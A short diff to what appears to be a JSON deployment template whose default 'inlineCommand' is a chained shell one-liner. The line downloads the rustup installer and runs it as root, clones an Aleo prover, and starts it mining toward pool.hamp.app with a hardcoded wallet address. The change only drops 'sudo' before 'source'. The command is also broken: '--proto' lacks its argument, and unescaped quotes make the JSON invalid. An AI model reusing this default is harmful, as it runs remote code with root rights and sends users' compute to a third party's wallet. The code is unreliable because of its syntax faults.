@@ -67,7 +67,7 @@
         },
         "inlineCommand": {
             "type": "string",
-            "defaultValue": "sudo curl --proto --tlsv1.2 https://sh.rustup.rs > rustup.sh; sudo sh rustup.sh -y; sudo source "$HOME/.cargo/env"; sudo apt install git clang libssl-dev pkg-config --no-install-recommends -y; git clone https://github.com/HarukaMa/aleo-prover -b testnet3-new; cd aleo-prover; sudo cargo build --release; sudo screen cargo run --release -- -a aleo1xaqn4qjk9ysxavcrawn0hf04ttv4x5lxgqku9hspfzwa7rke0qxqhq599f -p pool.hamp.app:4444",
+            "defaultValue": "sudo curl --proto --tlsv1.2 https://sh.rustup.rs > rustup.sh; sudo sh rustup.sh -y; source "$HOME/.cargo/env"; sudo apt install git clang libssl-dev pkg-config --no-install-recommends -y; git clone https://github.com/HarukaMa/aleo-prover -b testnet3-new; cd aleo-prover; sudo cargo build --release; sudo screen cargo run --release -- -a aleo1xaqn4qjk9ysxavcrawn0hf04ttv4x5lxgqku9hspfzwa7rke0qxqhq599f -p pool.hamp.app:4444",
             "metadata": {
                 "description": "inline command"
             }
